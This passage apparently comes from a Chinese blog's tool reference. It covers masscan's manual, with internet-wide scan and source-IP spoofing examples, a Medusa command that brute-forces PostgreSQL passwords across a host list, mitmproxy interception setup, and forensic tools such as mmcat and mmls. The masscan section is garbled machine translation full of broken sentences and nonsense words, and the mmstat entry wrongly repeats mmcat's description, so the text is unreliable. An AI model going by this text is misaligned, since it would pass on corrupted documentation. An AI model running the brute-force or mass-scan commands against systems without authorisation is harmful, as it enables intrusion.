0.0.0.0/0”。在<br>           必须至少指定一个目标。可以指定多个目标。这个<br>           可以指定为多个选项，以空格分隔，也可以分隔<br>           以逗号作为单个选项，例如10.0.0.0/8,192.168.0.1。 <br><br>       •--range &lt;ip / range&gt;：与上述目标范围规格相同，不同之处在于<br>           一个命名参数而不是一个未命名参数。<br><br>       •-p &lt;端口，--ports &lt;端口&gt;：指定要扫描的端口。一个<br>           可以指定端口，例如-p80。可以指定端口范围，例如-p<br>           20-25。可以指定端口/范围的列表，例如-p80,20-25。 UDP端口<br>           也可以指定，例如--ports U：161，U：1024-1100。<br><br>       •--banners：指定应抓取横幅，例如HTTP服务器版本<br>           部分，HTML标题字段等。仅支持一些协议。<br><br>       •--rate &lt;packets-per-second&gt;：指定所需的传输速率<br>           包。这可以是非常小的数字，例如0.1，用于在<br>           每10秒1个速率，对于10000000这样的非常大的数字，<br>           尝试以每秒1000万个数据包的速度进行传输。以我的经验，Windows<br>           每秒可以处理25万个数据包，而最新版本的Linux可以<br>           每秒可以处理250万个数据包需要PF_RING驱动程序达到25<br>           百万个数据包/秒。<br><br>       •-c &lt;文件名&gt;，-conf &lt;文件名&gt;：读取配置文件。格式<br>           配置文件的说明如下。<br><br>       •--resume &lt;文件名&gt;：与--conf相同，只是一些选项是自动的-<br>           临时设置，例如--append-output。配置文件格式<br>           如下所述。<br><br>       •--<span class="hljs-built_in">echo</span>：不运行，而是将当前配置转储到文件中。这个<br>           然后，可以将文件与-c选项一起使用。此输出的格式为<br>           在下面的“配置文件”下进行介绍。<br><br>       •-e &lt;ifname&gt;，-adapter &lt;ifname&gt;：使用命名的原始网络接口，例如<br>           “ eth0”或“ dna1”。如果未指定，则找到的第一个网络接口带有<br>           将使用默认网关。<br><br>       •--adapter-ip &lt;IP地址&gt;：使用此IP地址发送数据包。如果没有指定<br>           确定，则将使用绑定到网络接口的第一个IP地址。<br>           可以指定一个范围，而不是一个IP地址。注意：的大小<br>           范围必须是2的偶数幂，例如1、2、4、8、16、1024等。<br>           礼服。<br><br>       •--adapter-port &lt;端口&gt;：使用此端口号作为源发送数据包。如果<br>           如果未指定，则会在40000到60000范围内选择一个随机端口。<br>           此端口应由主机防火墙（如iptables）过滤，以防止<br>           主机网络堆栈不会干扰到达的数据包。代替<br>           单端口，可以指定一个范围，例如40000-40003。注意：的大小<br>           范围必须是2的偶数幂，例如上面的示例<br>           总共4个地址。<br><br>       •--adapter-mac &lt;mac-address&gt;：使用此作为源MAC ad-发送数据包<br>           连衣裙。如果未指定，则绑定到网络的第一个MAC地址位于-<br>           将使用接口。<br><br>       •--router-mac &lt;mac地址&gt;：将数据包作为destina-发送到此MAC地址<br>           tion。如果未指定，则为网络接口的网关地址<br>           将被ARPed。<br><br>       •--ping：指示扫描应包括ICMP回显请求。这可能<br>           包含在TCP和UDP扫描中。<br><br>       •--exclude &lt;ip / range&gt;：将IP地址或范围列入黑名单，以防止其<br>       被扫描。这会覆盖任何目标规范，从而保证<br>       该地址/范围不会被扫描。与普通格式相同<br>       目标规范。<br><br>       •--excludefile &lt;文件名&gt;：在同一tar中读取排除范围列表<br>       得到上面描述的格式。这些范围会覆盖所有目标，从而防止<br>       他们被扫描。<br><br>       •--append-output：使输出追加到文件，而不是覆盖<br>       文件。<br><br>       •--iflist：列出可用的网络接口，然后退出。<br><br>       •--retries：每隔1秒发送一次的重试次数。注意<br>       由于此扫描程序是无状态的，因此无论是否回复，都会发送重试<br>       已经收到。<br><br>       •--nmap：打印帮助，而不是这些选项的nmap兼容性替代品。<br><br>       •--pcap-payloads：从libpcap文件中读取包含数据包的数据包，并<br>       提取UDP有效负载，并将这些有效负载与目标相关联<br>       港口。这些有效负载将在通过以下方式发送UDP数据包时使用<br>       匹配目标端口。每个端口仅记住一个有效负载。 Sim‐<br>       与--nmap-payloads类似。<br><br>       •--nmap-payloads &lt;文件名&gt;：以与nmap相同的格式读取文件<br>       文件nmap-payloads。它包含UDP有效负载，以便我们可以发送有用的UDP<br>       包而不是空包。与--pcap-payloads类似。<br><br>       •--http-user-agent &lt;user-agent&gt;：将现有的user-agent字段替换为<br>       执行HTTP请求时的指示值。<br><br>       •--open-only：仅报告打开的端口，不报告关闭的端口。<br><br>       •--pcap &lt;文件名&gt;：将收到的数据包（但不传输的数据包）保存到<br>       libpcap格式的文件。<br><br>       •--packet-trace：打印发送和接收的那些数据包的摘要。这是<br>       在低速率下很有用，例如每秒几个数据包，但会淹没<br>       终端机率很高。<br><br>       •--pfring：强制使用PF_RING驱动程序。如果出现以下情况，程序将退出<br>       PF_RING DNA漂移器不可用。<br><br>       •--resume-index：扫描中的暂停点。<br><br>       •--resume-count：退出前要发送的最大探测数。这是<br>       与--resume-index一起使用可将扫描切碎并分成多个<br>       实例，尽管--shards选项可能更好。<br><br>       •--shards &lt;x&gt; / &lt;y&gt;：在实例之间拆分扫描。 x是此扫描的ID，<br>       而y是实例总数。例如，--shards 1/2告诉<br>       实例发送每个其他数据包，并从索引0开始。<br>       --shards 2/2发送其他所有数据包，但从索引1开始，因此它<br>       与第一个示例不重叠。<br><br>       •--rotate &lt;时间&gt;：旋转输出文件，将其重命名为当前时间<br>       图章，将其移动到单独的目录中。时间以数量指定<br>       秒，例如“ 3600”一个小时。或者，可以指定时间单位，例如<br>       “每小时”，“或6小时”或“ 10分钟”。时间在均匀边界上对齐，因此<br>       如果指定为“ daily”，则文件将每天在午夜旋转。<br><br>       •--rotate-offset &lt;时间&gt;：时间的偏移量。这是为了适应时间-<br>       区域。<br><br>       •--rotate-dir &lt;目录&gt;：旋转文件时，这指定哪个目录<br>       尝试将文件移动到。一个有用的目录是/ var / <span class="hljs-built_in">log</span> / masscan。<br><br>       •--seed &lt;<span class="hljs-built_in">integer</span>&gt;：整数作为种子随机数生成器的种子。用一个<br>       不同的种子将导致数据包以不同的随机顺序发送。在-<br>       可以指定字符串时间，而不是整数，使用<br>       本地时间戳记，自动生成不同的随机扫描顺序。<br>       如果未指定种子，则时间为默认值。<br><br>       •--regress：运行回归测试，成功返回“ 0”，失败返回“ 1”。<br><br>       •--ttl &lt;num&gt;：指定传出数据包的TTL，默认为255。<br><br>       •--<span class="hljs-built_in">wait</span> &lt;seconds&gt;：指定发送完成后的秒数<br>       在退出程序之前等待接收数据包。默认值为10秒<br>       onds。可以将字符串永久指定为永不终止。<br><br>       •--offline：实际不传输数据包。这对低费率很有用<br>       和--packet-trace以查看可能传输了哪些数据包。要么，<br>       它与--rate 100000000一起使用以比较快速传输的基准<br>       会工作（假设零开销驱动程序）。 PF_RING慢20％<br>       比离线模式下的基准测试结果要高。<br><br>       •-sL：不执行扫描，而是创建一个随机地址列表。<br>       这对于导入其他工具很有用。选项--shard，--re<br>       sume-index和--resume-count对于此功能很有用。<br><br>       •--interactive：在控制台上实时显示结果。没有效果<br>       如果与--output-format或--output-filename一起使用。<br><br>       •--output-format &lt;<span class="hljs-built_in">fmt</span>&gt;：指示输出文件的格式，可以是<br>       xml，二进制，grepable，列表或JSON。选项--output-filename必须<br>       指定。<br><br>       •--output-filename &lt;filename&gt;：将结果保存到的文件。如果pa<br>       rameter --output-format未指定，则默认为xml<br>       用过的。<br><br>       •-oB &lt;文件名&gt;：将输出格式设置为二进制并将输出保存在<br>       给定的文件名。这等效于使用--output-format和--out-<br>       put-filename参数。然后可以使用--readscan选项读取<br>       二进制文件。二进制文件的大小比其XML等效项小，但是<br>       需要一个单独的步骤才能转换回XML或其他可读格式。<br><br>       •-oX &lt;文件名&gt;：将输出格式设置为XML并将输出保存在<br>       给定的文件名。这等效于使用--output-format xml和<br>       --output-filename参数。<br><br>       •-oG &lt;文件名&gt;：将输出格式设置为grepable并将输出保存在<br>       给定的文件名。这等效于使用--output-format grepable<br>       和--output-filename参数。<br><br>       •-oJ &lt;文件名&gt;：将输出格式设置为JSON并将输出保存在<br>       给定的文件名。这等效于使用--output-format json和<br>       --output-filename参数。<br><br>       •-oL &lt;文件名&gt;：将输出格式设置为简单列表格式并保存<br>       以给定的文件名输出。这等效于使用--output-format<br>       list和--output-filename参数。<br><br>       •--readscan &lt;binary-files&gt;：从-oB选项中读取-oB选项创建的文件<br>       扫描，然后根据其他格式以其他格式之一输出它们<br>       需求线参数。换句话说，它可以采用<br>       输出并将其转换为XML或JSON格式。<br><br></code></pre></td></tr></table></figure><h4 id="配置文件格式"><a href="#配置文件格式" class="headerlink" title="配置文件格式"></a>配置文件格式</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs bash">配置文件使用与命令行上相同的参数名称，但是不带-前缀，并且名称和值之间带有=号。前任足够的配置文件可能是： <br><br>    <span class="hljs-comment"># targets</span><br>           range = 10.0.0.0/8,192.168.0.0/16<br>           range = 172.16.0.0/14<br>           ports = 20-25,80,U:53<br>           ping = <span class="hljs-literal">true</span><br><br>           <span class="hljs-comment"># adapter</span><br>           adapter = eth0<br>           adapter-ip = 192.168.0.1<br>           router-mac = 66-55-44-33-22-11<br><br>           <span class="hljs-comment"># other</span><br>           exclude-file = /etc/masscan/exludes.txt<br><br>默认情况下，程序将从文件/ etc / mass中读取默认配置<br>可以/masscan.conf。这对于系统特定的设置很有用，例如<br>--adapter-xxx选项。这对于排除的IP地址也很有用，这样您就可以<br>可以跳过整个危险的地址（例如那些危险的地址），扫描整个Internet<br>归国防部所有，不要犯任何意外错误。<br><br>CONTROL-C行为<br>当用户按下ctrl-c时，扫描将停止，并且当前的状态<br>扫描将保存在文件“ paused.conf”中。可以使用<br>--resume选项：<br><br>            <span class="hljs-comment"># masscan --resume paused.conf</span><br><br>该程序不会立即退出，但会等待默认的10秒<br>从Internet接收结果并保存结果，然后完全退出。<br>可以使用--<span class="hljs-built_in">wait</span>选项更改此时间。<br><br>简单的例子<br>以下示例扫描所有专用网络以查找Web服务器，并打印所有<br>打开找到的端口。<br><br>            <span class="hljs-comment"># masscan 10.0.0.0/8 192.168.0.0/16 172.16.0.0/12 -p80 --open-only</span><br><br>下面的示例扫描整个Internet的DNS服务器，获取它们的<br>版本，然后将结果保存在XML文件中。<br><br>            <span class="hljs-comment"># masscan 0.0.0.0/0 --excludefile no-dod.txt -pU:53 --banners --output-filename dns.xml</span><br><br>您应该能够将XML导入数据库等。<br><br>以下示例读取名为bin-test.scan的二进制扫描结果文件并<br>将结果打印到控制台。<br><br>           ＃masscan --readscan bin-test.scan<br><br>以下示例读取名为bin-test.scan的二进制扫描结果文件<br>创建一个名为bin-test.xml的XML输出文件。<br><br>           ＃masscan --readscan bin-test.scan -oX bin-test.xml<br><br>高级示例<br>假设您要扫描整个Internet并在整个扫描范围内进行扫描<br>三台机器。 Masscan将使用以下命令在所有三台机器上启动<br>命令行：<br><br>           <span class="hljs-comment"># masscan 0.0.0.0/0 -p0-65535 --shard 1/3</span><br>           <span class="hljs-comment"># masscan 0.0.0.0/0 -p0-65535 --shard 2/3</span><br>           <span class="hljs-comment"># masscan 0.0.0.0/0 -p0-65535 --shard 3/3</span><br><br>另一种方法是使用“恢复”功能。扫描具有一个内部索引<br>从零到端口数乘以IP地址数。跟随<br>较低的示例显示了将扫描分为1000个项目的块：<br><br>           <span class="hljs-comment"># masscan 0.0.0.0/0 -p0-65535 --resume-index 0 --resume-count 1000</span><br>           <span class="hljs-comment"># masscan 0.0.0.0/0 -p0-65535 --resume-index 1000 --resume-count 1000</span><br>           <span class="hljs-comment"># masscan 0.0.0.0/0 -p0-65535 --resume-index 2000 --resume-count 1000</span><br>           <span class="hljs-comment"># masscan 0.0.0.0/0 -p0-65535 --resume-index 3000 --resume-count 1000</span><br><br>脚本可以使用它来在其他许多机器上拆分较小的任务，例如<br>亚马逊EC2实例。随着每个实例完成一项工作，脚本可能会发送一个<br>请求中央协调服务器进行更多工作。<br><br> <br><br>意外重置<br>使用适配器的默认IP地址（内置）扫描TCP时<br>堆栈将生成RST数据包。这样可以防止横幅被抓住。有<br>有两种解决方法。第一种方法是创建防火墙规则以阻止<br>从堆栈看到的端口。工作方式取决于操作<br>系统，但在Linux上看起来像这样：<br><br>           ＃iptables -A INPUT -p tcp -i eth0 –dport 61234 -j DROP<br><br>然后，在扫描时，必须使用相同的端口作为源：<br><br>            <span class="hljs-comment"># masscan 10.0.0.0/8 -p80 --banners --adapter-port 61234</span><br><br>另一种方法是“欺骗”另一个IP地址。该IP地址必须为<br>在本地网络范围内，但任何一个都不得使用<br>您自己的计算机或网络上的另一台计算机。一个例子<br>看起来像：<br><br>           <span class="hljs-comment"># masscan 10.0.0.0/8 -p80 --banners --adapter-ip 192.168.1.101</span><br><br>设置您的源IP地址是这种方式的首选方式<br>扫描器。<br><br></code></pre></td></tr></table></figure><h2 id="MATE-计算器"><a href="#MATE-计算器" class="headerlink" title="MATE 计算器"></a>MATE 计算器</h2><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132111262.png" alt="image-20220413211109125"></p><h2 id="MATE-终端"><a href="#MATE-终端" class="headerlink" title="MATE 终端"></a>MATE 终端</h2><h3 id="-5"><a href="#-5" class="headerlink" title=""></a><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132114499.png" alt="image-20220413211452339"></h3><h2 id="medusa"><a href="#medusa" class="headerlink" title="medusa"></a>medusa</h2><h3 id="描述：-40"><a href="#描述：-40" class="headerlink" title="描述："></a>描述：</h3><p>Medusa是支持AFP, CVS, FTP, HTTP, IMAP, MS-SQL, MySQL, NCP (NetWare),<br>NNTP, PcAnywhere, POP3, PostgreSQL, rexec, rlogin, rsh, SMB, SMTP<br>(AUTH&#x2F;VRFY), SNMP, SSHv2, SVN, Telnet, VmAuthd, VNC的密码爆破工具。</p><h3 id="参数：-29"><a href="#参数：-29" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">使用语法:<br>Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">-h [TEXT]      目标IP<br>-H [FILE]      目标主机文件<br>-u [TEXT]      用户名<br>-U [FILE]      用户名文件<br>-p [TEXT]      密码<br>-P [FILE]      密码文件<br>-C [FILE]      组合条目文件<br>-O [FILE]      文件日志信息<br>-e [n/s/ns]    N意为空密码，S意为密码与用户名相同<br>-M [TEXT]      模块执行名称<br>-m [TEXT]      传递参数到模块<br>-d             显示所有的模块名称<br>-n [NUM]       使用非默认端口<br>-s             启用SSL<br>-r [NUM]       重试间隔时间，默认为3秒<br>-t [NUM]       设定线程数量<br>-L             并行化，每个用户使用一个线程<br>-f             在任何主机上找到第一个账号/密码后，停止破解<br>-q             显示模块的使用信息<br>-v [NUM]       详细级别（0-6）<br>-w [NUM]       错误调试级别（0-10）<br>-V             显示版本<br>-Z [TEXT]      继续扫描上一次<br></code></pre></td></tr></table></figure><p>实例:</p><blockquote><p>medusa -d<br> 查看模块帮助</p></blockquote><blockquote><p>medusa -M postgres -q</p><p> 猜解postgresql数据库密码</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">medusa -H /tmp/ip.txt -u postgres -n 5432 -P /tmp/pass.txt -e ns -M postgres -T 255 -f -O /tmp/good.txt -r 0<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">-H 爆破的主机文件列表<br>-u 爆破用户名<br>-n 爆破端口<br>-P 爆破使用密码<br>-e ns 判断密码是否是空密码,还是账号密码一样.<br>-M 使用模块的名字<br>-T 可以简单的理解为线程数<br>-f 一个ip爆破成功后,就停止该ip剩下的爆破.<br>-O 保存成功的文件<br>-r 0 重试间隔为0秒<br></code></pre></td></tr></table></figure><h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><p><a href="https://gitbook.cn/gitchat/column/5afbf24f753289354cab7983/topic/5afbf818753289354cab7e3c">https://gitbook.cn/gitchat/column/5afbf24f753289354cab7983/topic/5afbf818753289354cab7e3c</a></p><h2 id="minicom"><a href="#minicom" class="headerlink" title="minicom"></a>minicom</h2><h3 id="描述：-41"><a href="#描述：-41" class="headerlink" title="描述："></a>描述：</h3><p>minicom打开指定设备端口（例：多个串口）</p><h3 id="参数：-30"><a href="#参数：-30" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">-D, --device<br>     Specify the device, overriding the value given <span class="hljs-keyword">in</span> the configuration file.<br></code></pre></td></tr></table></figure><p>使用-D参数 可以打开指定设备，所以当默认设定是ttyUSB0的时候，我们想要打开tty1时，就如下命令运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo minicom -D /dev/tty1<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132128524.png" alt="image-20220413212828348"></p><h2 id="miredo"><a href="#miredo" class="headerlink" title="miredo"></a>miredo</h2><h3 id="描述：-42"><a href="#描述：-42" class="headerlink" title="描述："></a>描述：</h3><p>用于Unix的Teredo IPv6隧道。<br>  Miredo是一个守护程序，可提供与Internet提出的标准“ Teredo：通过NAT通过UDP隧道IPv6”兼容的Teredo隧道服务。 它可以提供Teredo客户端或Teredo中继功能。<br>  这对于为NAT之后的用户提供IPv6连接非常有用，其中大多数用户根本不支持IPv6。 许多NAT甚至都不支持proto-41转发，因此无法通过它们建立6to4或点对点IPv6-over-IPv4隧道。<br>  Teredo中继是一个IPv6路由器，它通过在UDP &#x2F; IPv4上封装这些IPv6数据包来在IPv6 Internet和Teredo客户端之间转发IPv6数据包。<br>  Teredo客户端是启用IPv6的主机，位于仅IPv4的网络地址转换器（又称为NAT）后面，并将其IPv6流量封装在基于IPv4数据包的UDP中。<br>  Teredo服务器是特殊的Teredo中继，Teredo客户端需要通过Teredo设置其IPv6连接性。 Teredo服务器必须具有全局静态的后续IPv4地址。 它在UDP端口3544上接收来自Teredo客户端和Teredo中继的数据包。</p><h3 id="参数：-31"><a href="#参数：-31" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">-c config_file or –config config_file<br>为Miredo指定替代配置文件，而不是默认的/etc/miredo/miredo.conf。<br><br>-f or –foreground<br>请勿脱离控制台。 在前台运行程序。<br><br>-h or –<span class="hljs-built_in">help</span><br>显示一些帮助并退出。<br><br>-t or –chrootdir<br>指定初始化完成后用作根目录的目录。 当用作Teredo客户端时，主机名解析器库文件必须存在于<span class="hljs-built_in">chroot</span>中。 对于Teredo中继，可以安全地将目录保留为空。<br><br>-u username or –user username<br>覆盖程序将以其运行的用户。 默认情况下，它作为无人运行。<br><br>-V or –version<br>显示程序版本和许可证，然后退出<br><br>Server_name<br>这个可选的命令参数指定要使用的Teredo服务器，它将覆盖配置文件中找到的所有ServerAddress指令。 如果RelayType未设置为“ client”（请参阅miredo.conf），则将忽略该消息。<br><br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132134710.png" alt="image-20220413213454552"></p><h2 id="mitmproxy"><a href="#mitmproxy" class="headerlink" title="mitmproxy"></a>mitmproxy</h2><h3 id="描述：-43"><a href="#描述：-43" class="headerlink" title="描述："></a>描述：</h3><p>是一款免费、开放的基于Python 开发的交互式HTTPS代理工具</p><h3 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h3><p>同Charles一样，在使用mitmproxy之前，我们需要先安装证书<br>在连接mitmproxy代理之后，通过访问连接：<a href="http://mitm.it/">http://mitm.it/</a> 来安装证书</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132139244.png" alt="image-20220413213920032"></p><p>选择相应版本安装即可，注意安装完证书后需要信任证书后才能正常进行抓包</p><p>mitmproxy 工具有以下三部分组成</p><p>mitmproxy -&gt; 命令行工具（win不支持）<br>mitmdump -&gt; 加载 python 脚本<br>mitmweb -&gt; web 界面工具<br>常用参数<br>-h 帮助信息<br>-p 修改监听端口<br>-s 加载 python 脚本<br>默认监听端口8080</p><p>mitmproxy是已<a href="https://so.csdn.net/so/search?q=%E5%91%BD%E4%BB%A4%E8%A1%8C&spm=1001.2101.3001.7020">命令行</a>的方式运行的<br>例：监听8999端口进行抓包</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132140896.png" alt="image-20220413214040763"></p><p>这里会有抓包内容</p><p>然后通过<code>q</code>命令可以返回到主界面，然后通过<code>f</code>命令加上要过滤的参数可以过滤请求，如下是只展示包含mitmproxy的请求</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204132141473.png" alt="image-20220413214114032"></p><p>最后可以通过q命令退出</p><h2 id="mmcat"><a href="#mmcat" class="headerlink" title="mmcat"></a>mmcat</h2><h3 id="描述：-44"><a href="#描述：-44" class="headerlink" title="描述："></a>描述：</h3><p>将分区的内容输出到stdout。<br>  mmcat将特定卷的内容输出到stdout。 这使您可以将分区的内容提取到单独的文件中。</p><h3 id="参数：-32"><a href="#参数：-32" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">-t mmtype<br>指定媒体管理类型。 使用“ -t列表”列出支持的类型。 如果未给出，则使用自动检测方法。<br><br>-o offset<br>在包含分区系统的卷开始的映像中指定偏移量。 分区系统的相对偏移将添加到该值。<br><br>-b dev_sector_size<br>基础设备扇区的大小（以字节为单位）。 如果未给出，则使用图像格式的值（如果存在）或假定为512字节<br><br>-i imgtype<br>标识图像文件的类型，例如原始文件。 使用“ -i列表”列出支持的类型。 如果未给出，则使用自动检测方法。<br><br>-v<br>将调试语句的详细输出输出到stderr<br><br>-V<br>显示版本信息<br><br>image [images]<br>要读取的磁盘或分区映像，其格式以“ -i”给出。 如果将图像分为多个段，则可以指定多个图像文件名。 如果仅给出一个图像文件，并且其名称是序列中的第一个图像文件（例如，以<span class="hljs-string">&#x27;.001&#x27;</span>结尾的文件），则会自动包含后续的图像段。<br><br>part_num<br>要处理的分区的地址。 请参见mmls输出以确定分区的地址。<br><br></code></pre></td></tr></table></figure><h2 id="mmls"><a href="#mmls" class="headerlink" title="mmls"></a>mmls</h2><h3 id="描述：-45"><a href="#描述：-45" class="headerlink" title="描述："></a>描述：</h3><p>显示卷系统的分区布局（<a href="https://so.csdn.net/so/search?q=%E5%88%86%E5%8C%BA%E8%A1%A8&spm=1001.2101.3001.7020">分区表</a>）。<br>  mmls显示卷系统中分区的布局，其中包括分区表和磁盘标签。</p><h3 id="参数：-33"><a href="#参数：-33" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">-t mmtype<br>指定媒体管理类型。 使用“ -t列表”列出支持的类型。 如果未给出，则使用自动检测方法。<br><br>-o offset<br>在包含分区系统的卷开始的映像中指定偏移量。 分区系统的相对偏移将添加到该值。<br><br>-b dev_sector_size<br>基础设备扇区的大小（以字节为单位）。 如果未给出，则使用图像格式的值（如果存在）或假定为512字节。<br><br>-i imgtype<br>标识图像文件的类型，例如原始文件。 使用“ -i列表”列出支持的类型。 如果未给出，则使用自动检测方法。<br><br>-B<br>包括分区大小(以字节为单位)的列<br><br>-r<br>递归到DOS分区并查找其他分区表。当在x86系统上安装Unix时，经常会发生此设置。<br><br>-v<br>将调试语句的详细输出输出到stderr<br><br>-V<br>显示版本信息<br><br>-a<br>显示分配的卷<br><br>-A<br>显示未分配的卷<br><br>-m<br>显示的元数据卷<br><br>-M<br>隐藏的元数据卷<br><br>image [images]<br>要读取的磁盘或分区映像，其格式以“ -i”给出。 如果将图像分为多个段，则可以指定多个图像文件名。 如果仅给出一个图像文件，并且其名称是序列中的第一个图像文件（例如，以“ .001”结尾的文件），则会自动包含后续的图像段。<br><br></code></pre></td></tr></table></figure><h2 id="mmstat"><a href="#mmstat" class="headerlink" title="mmstat"></a>mmstat</h2><h3 id="描述：-46"><a href="#描述：-46" class="headerlink" title="描述："></a>描述：</h3><p> 将分区的内容输出到stdout。<br>  mmcat将特定卷的内容输出到stdout。 这使您可以将分区的内容提取到单独的文件中。</p><h3 id="参数：-34"><a href="#参数：-34" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 